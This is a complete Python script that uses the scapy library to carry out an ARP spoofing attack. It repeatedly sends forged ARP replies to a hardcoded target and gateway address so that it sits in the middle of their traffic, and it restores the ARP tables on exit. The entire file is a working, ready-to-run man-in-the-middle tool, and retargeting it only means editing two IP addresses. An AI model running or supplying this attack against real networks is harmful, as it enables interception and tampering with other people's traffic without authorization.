#!/usr/bin/python3
import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answer = scapy.srp(arp_request_broadcast, timeout=5, verbose=True)[0]
    if answer:
        return answer[0][1].hwsrc

    return None


def spoof_arp(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        print(f'[+] {target_ip}@{target_mac}')
        arp_response = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoofed_ip)
        scapy.send(arp_response, verbose=True)

    else:
        print(f'[-] {target_ip}')


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)


def main():
    target_ip = '192.168.100.4'
    gateway_ip = '10.0.2.2'
    try:
        sent_packets_count = 0
        while True:
            spoof_arp(target_ip, gateway_ip)
            spoof_arp(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f'[*] Packets sent {sent_packets_count}')
            time.sleep(2)

    except KeyboardInterrupt:
        print('\nCtrl+C pressed....................Exiting')
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")


if __name__ == '__main__':
    main()

